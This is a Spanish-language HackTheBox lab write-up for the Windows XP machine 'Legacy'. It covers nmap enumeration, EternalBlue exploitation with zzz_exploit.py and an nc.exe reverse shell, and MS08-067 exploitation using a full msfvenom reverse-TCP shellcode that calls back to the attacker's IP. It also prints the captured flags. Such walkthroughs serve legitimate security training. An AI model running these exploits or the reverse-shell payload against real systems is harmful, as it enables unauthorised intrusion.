---
layout      : post
title       : "Maquina Legacy - htb writeup"
author      : Firtsmiracle
image       : assets/images/HTB/htb-writeup-Legacy/banner.png
category    : [ hackthebox ]
tags        : [ SMB Enumeration, Eternal Blue explotation, (MS17-010), (MS08-067)]
---

El dia de hoy vamos a resolver `Legacy` de `hackthebox` una maquina `windows` sencilla de dificultad facil, en la explotación vamos a repasar los conceptos para realizar una explotación manual de `eternal blue` usando el `zzz_exploit.py`, ademas de forma alternativa para explotar la maquina realizaremos una enumeración por `smb` donde se nos reprotara que el servicio es vulnerable a el exploit `MS08_067` el cual tambien explotaremos a traves de la creación de un `shellcode` para asi obtener acceso como el usuario `adminsitrator`.


Comenzaremos como de costumbre creando un directorio con el nombre de la maquina:

```bash
❯ mkdir Legacy
❯ ls
 Legacy
```
Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:

```bash
❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
```

## ENUMERACION [#](#enumeracion) {#enumeracion}
 

Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando `ping`:

```bash
❯ ping -c 1 10.10.10.4
PING 10.10.10.4 (10.10.10.4) 56(84) bytes of data.
64 bytes from 10.10.10.4: icmp_seq=1 ttl=127 time=119 ms

--- 10.10.10.4 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 118.571/118.571/118.571/0.000 ms
```

Vemos que la maquina nos responde, con un ttl de `127` correspondiente a una maquina `windows`.


### ESCANEO DE PUERTOS

| Parámetro  |                    Descripción                          |
| -----------|:--------------------------------------------------------|                                           
|[-p-](#enumeracion)      | Escaneamos todos los 65535 puertos.                     |
|[--open](#enumeracion)     | Solo los puertos que estén abiertos.                    |
|[-v](#enumeracion)        | Permite ver en consola lo que va encontrando (verbose). |
|[-oG](#enumeracion)        | Guarda el output en un archivo con formato grepeable para que mediante una funcion de [S4vitar](https://s4vitar.github.io/) nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles |


Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre `openPorts`:

```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.4 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-29 18:54 GMT
Initiating SYN Stealth Scan at 18:54
Scanning 10.10.10.4 [65535 ports]
Discovered open port 139/tcp on 10.10.10.4
Discovered open port 445/tcp on 10.10.10.4
Discovered open port 135/tcp on 10.10.10.4
Completed SYN Stealth Scan at 18:55, 21.64s elapsed (65535 total ports)
Nmap scan report for 10.10.10.4
Host is up, received user-set (0.18s latency).
Scanned at 2023-06-29 18:54:52 GMT for 21s
Not shown: 56233 closed tcp ports (reset), 9299 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack ttl 127
139/tcp open  netbios-ssn  syn-ack ttl 127
445/tcp open  microsoft-ds syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 21.77 seconds
           Raw packets sent: 106649 (4.693MB) | Rcvd: 65813 (2.633MB)
```

### ESCANEO DE VERSION Y SERVICIOS

```java
❯ nmap -sCV -p135,139,445 10.10.10.4 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-29 18:56 GMT
Nmap scan report for 10.10.10.4
Host is up (0.18s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 5d00h27m34s, deviation: 2h07m16s, median: 4d22h57m34s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:a9:4a (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2023-07-04T23:53:50+03:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.17 seconds
```

Visulizamos información interesante de los puertos escaneados y que el equipo corresponde a una maquina `Windows XP`:

| Puerto | Servicio | Versión |
| ------ | -------- | --------|
| 135     | RPC     |   Microsoft Windows RPC |
| 139  | LDAP     | Microsoft Windows netbios-ssn |
| 445   |  SMB   |  Windows XP microsoft-ds |


## EXPLOTACION [#](#explotación) {#explotación}


Como vemos que la maquina corresponde `Windows XP`, podemos explotar el `eternal blue`, asi que vamos a explotarlo usando el exploit de github de warawit.


* [https://github.com/worawit/MS17-010](https://github.com/worawit/MS17-010)

Descargamos al repositorio y ejecutamos el `checker.py`, para encontrar `named pipes` vulnerables.

> Named Pipe: Una named pipe es un canal de comunicaciones half-duplex o full-duplex entre un servidor pipe y uno o más clientes. Todas las instancias de una named pipe comparten el mismo nombre, pero cada instancia tiene sus propios búfers y handles y tienen conductos separados para la comunicación cliente-servidor.


Ejectamos el `checker.py` el cual nos reporta dos `named pipes` de los que podemos abusar.


```bash
❯ python2 checker.py 10.10.10.4
Target OS: Windows 5.1
The target is not patched

=== Testing named pipes ===
spoolss: Ok (32 bit)
samr: STATUS_ACCESS_DENIED
netlogon: STATUS_ACCESS_DENIED
lsarpc: STATUS_ACCESS_DENIED
browser: Ok (32 bit)
```

Ahora nos abriremos el `zzz_exploit.py`, para modificar la instrucción que queremos ejecutar al lanzar el exploit, en la que nos montaremos un recurso compartido en nuestra maquina donde alojaremos el `nc.exe` el cual se ejecutara otorgandonos una conexión a nuestra maquina. Esto descomentado la opción `service_exec` y comentaremos las lineas previas.


![](/assets/images/HTB/htb-writeup-Legacy/lega1.PNG)


Para ello, podemos descarganos el ejecutable de `nc`, para ello iremos al siguiente enlace y descargaremos el correspondiente a la versión `1.12`.


* [Netcat](https://eternallybored.org/misc/netcat/)

![](/assets/images/HTB/htb-writeup-Legacy/lega2.PNG)


Si optamos por descargarlo de esta manera obtendremos un comprimido, el cual debemos descomprimirlo en una carpeta aparte ya que este contiene muchos archivos.


En mi caso yo usare el `nc.exe` que contempla el repositorio de `danil miesler`.

* [SecLists](https://github.com/danielmiessler/SecLists)

```bash
❯ cp /opt/SecLists/Miscellaneous/web/http-request-headers/nc.exe .
❯ ls
 MS17-010   nc.exe   netcat-win32-1.12.zip
```

Procedemos a montar nuestro recurso compartido, donde alojaremos el `nc.exe`.


```bash
❯ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Nos ponemos en escucha con `ncat` por el puerto que configuramos, en este caso el correspondiente a el `443`.


## ELEVACION DE PRIVILEGIOS [#](#escalada-de-privilegios) {#escalada-de-privilegios}


Ejecutamos el `zzz_exploit.py` junto con el named pipe que previamente nos reporto el `checker.py`.

```bash
❯ python2 zzz_exploit.py 10.10.10.4 spoolss
Target OS: Windows 5.1
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x86101b30
SESSION: 0xe1b1cc68
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
```

y recibimos la conexión.

```cmd
❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.4.
Ncat: Connection from 10.10.10.4:1046.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

Ahora podemos ir al directorio del usuario john y visualizar la primera flag `user.txt`.


```cmd
C:\Documents and Settings\john\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\john\Desktop

16/03/2017  09:19     <DIR>          .
16/03/2017  09:19     <DIR>          ..
16/03/2017  09:19                 32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.342.070.272 bytes free

C:\Documents and Settings\john\Desktop>type user.txt
type user.txt
e69af0e4f443de7e36876fda4ec7644f
```

## EXPLOTACION ALTERNA [#](#explotacion-alterna) {#explotacion-alterna}


Ahora para comprometer la maquina de una manera alternativa, primero usaremos los scripts `smb-vuln\*` de nmap en el puerto `445`.


```bash
QUITTING!
❯ nmap --script smb-vuln\* -p445 10.10.10.4 -oN smbScan
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-29 19:55 GMT
Nmap scan report for 10.10.10.4
Host is up (0.12s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-054: false
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250

Nmap done: 1 IP address (1 host up) scanned in 9.88 seconds
```

Nmap nos reporta que el servicio es vulnerable a `ms08-067` ya que corresponde a un `Windows XP`.


Para poder explotarla vamos a descargarnos un exploit de `andyacer` de github:

* [https://github.com/andyacer/ms08_067](https://github.com/andyacer/ms08_067)
 
Ahi nos explican a fondo en que consiste la explotación y nos pide que generemos un `shellcode` el cual debemos ingresar al `exploit`.


Para ello vamos a generar el shellcode usando `msfvenom`, si no sabes como en el repositorio te explica como debemos hacerlo exactamente, solo debemos especificar nuestra ip y el puerto.


```bash
❯ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.3 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of c file: 1491 bytes
unsigned char buf[] = 
"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\x63\xc8\xc3\x99\x83\xee\xfc\xe2\xf4\x9f\x20\x41\x99"
"\x63\xc8\xa3\x10\x86\xf9\x03\xfd\xe8\x98\xf3\x12\x31\xc4"
"\x48\xcb\x77\x43\xb1\xb1\x6c\x7f\x89\xbf\x52\x37\x6f\xa5"
"\x02\xb4\xc1\xb5\x43\x09\x0c\x94\x62\x0f\x21\x6b\x31\x9f"
"\x48\xcb\x73\x43\x89\xa5\xe8\x84\xd2\xe1\x80\x80\xc2\x48"
"\x32\x43\x9a\xb9\x62\x1b\x48\xd0\x7b\x2b\xf9\xd0\xe8\xfc"
"\x48\x98\xb5\xf9\x3c\x35\xa2\x07\xce\x98\xa4\xf0\x23\xec"
"\x95\xcb\xbe\x61\x58\xb5\xe7\xec\x87\x90\x48\xc1\x47\xc9"
"\x10\xff\xe8\xc4\x88\x12\x3b\xd4\xc2\x4a\xe8\xcc\x48\x98"
"\xb3\x41\x87\xbd\x47\x93\x98\xf8\x3a\x92\x92\x66\x83\x97"
"\x9c\xc3\xe8\xda\x28\x14\x3e\xa0\xf0\xab\x63\xc8\xab\xee"
"\x10\xfa\x9c\xcd\x0b\x84\xb4\xbf\x64\x37\x16\x21\xf3\xc9"
"\xc3\x99\x4a\x0c\x97\xc9\x0b\xe1\x43\xf2\x63\x37\x16\xc9"
"\x33\x98\x93\xd9\x33\x88\x93\xf1\x89\xc7\x1c\x79\x9c\x1d"
"\x54\xf3\x66\xa0\xc9\x93\x73\xcb\xab\x9b\x63\xc9\x78\x10"
"\x85\xa2\xd3\xcf\x34\xa0\x5a\x3c\x17\xa9\x3c\x4c\xe6\x08"
"\xb7\x95\x9c\x86\xcb\xec\x8f\xa0\x33\x2c\xc1\x9e\x3c\x4c"
"\x0b\xab\xae\xfd\x63\x41\x20\xce\x34\x9f\xf2\x6f\x09\xda"
"\x9a\xcf\x81\x35\xa5\x5e\x27\xec\xff\x98\x62\x45\x87\xbd"
"\x73\x0e\xc3\xdd\x37\x98\x95\xcf\x35\x8e\x95\xd7\x35\x9e"
"\x90\xcf\x0b\xb1\x0f\xa6\xe5\x37\x16\x10\x83\x86\x95\xdf"
"\x9c\xf8\xab\x91\xe4\xd5\xa3\x66\xb6\x73\x23\x84\x49\xc2"
"\xab\x3f\xf6\x75\x5e\x66\xb6\xf4\xc5\xe5\x69\x48\x38\x79"
"\x16\xcd\x78\xde\x70\xba\xac\xf3\x63\x9b\x3c\x4c";
```

Ese shellcode generado, ahora vamos a introducirlo en el `exploit`. 

![](/assets/images/HTB/htb-writeup-Legacy/lega3.PNG)


Ejecutamos el exploit sin antes ponernos en escucha con `ncat` en el puerto `443`.

```bash
❯ python2 ms08_067_2018.py 10.10.10.4 6 445
#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#
#   Mod in 2018 by Andy Acer:
#   - Added support for selecting a target port at the command line.
#     It seemed that only 445 was previously supported.
#   - Changed library calls to correctly establish a NetBIOS session for SMB transport
#   - Changed shellcode handling to allow for variable length shellcode. Just cut and paste
#     into this source file.
#######################################################################

Windows XP SP3 English (NX)

[-]Initiating connection
[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
Exploit finish
```

Recibimos la conexión, ahora podemos ir al directorio del usuario `Administrator` y leer la segunda flag `root.txt`.

```cmd
❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.4.
Ncat: Connection from 10.10.10.4:1047.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32> cd "Documents and Settings"
cd "Documents and Settings"

C:\Documents and Settings>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings

16/03/2017  09:07     <DIR>          .
16/03/2017  09:07     <DIR>          ..
16/03/2017  09:07     <DIR>          Administrator
16/03/2017  08:29     <DIR>          All Users
16/03/2017  08:33     <DIR>          john
               0 File(s)              0 bytes
               5 Dir(s)   6.403.846.144 bytes free

C:\Documents and Settings>cd Administrator\Desktop
cd Administrator\Desktop

C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
993442d258b0e0ec917cae9e695d5713
C:\Documents and Settings\Administrator\Desktop>
```

